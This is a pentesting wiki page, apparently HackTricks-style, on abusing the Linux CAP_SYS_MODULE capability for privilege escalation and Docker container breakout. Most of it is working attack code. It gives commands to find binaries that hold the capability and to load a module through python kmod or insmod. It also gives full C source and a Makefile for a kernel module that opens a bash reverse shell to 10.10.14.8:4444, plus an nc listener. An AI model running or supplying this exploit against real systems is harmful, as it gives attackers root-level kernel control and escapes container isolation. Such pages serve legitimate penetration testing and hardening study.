# Linux Capabilities - CAP SYS MODULE

## CAP_SYS_MODULE


**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** empowers a process to **load and unload kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls)**, offering direct access to the kernel's core operations. This capability presents critical security risks, as it enables privilege escalation and total system compromise by allowing modifications to the kernel, thereby bypassing all Linux security mechanisms, including Linux Security Modules and container isolation.
**This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**

**Example with binary**

In the following example the binary **`python`** has this capability.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

By default, **`modprobe`** command checks for dependency list and map files in the directory **`/lib/modules/$(uname -r)`**.\
In order to abuse this, lets create a fake **lib/modules** folder:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Then **compile the kernel module you can find 2 examples below and copy** it to this folder:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Finally, execute the needed python code to load this kernel module:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Example 2 with binary**

In the following example the binary **`kmod`** has this capability.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Which means that it's possible to use the command **`insmod`** to insert a kernel module. Follow the example below to get a **reverse shell** abusing this privilege.

**Example with environment (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Inside the previous output you can see that the **SYS_MODULE** capability is enabled.

**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> The blank char before each make word in the Makefile **must be a tab, not spaces**!

Execute `make` to compile it.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Finally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**The code of this technique was copied from the laboratory of "Abusing SYS_MODULE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Another example of this technique can be found in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
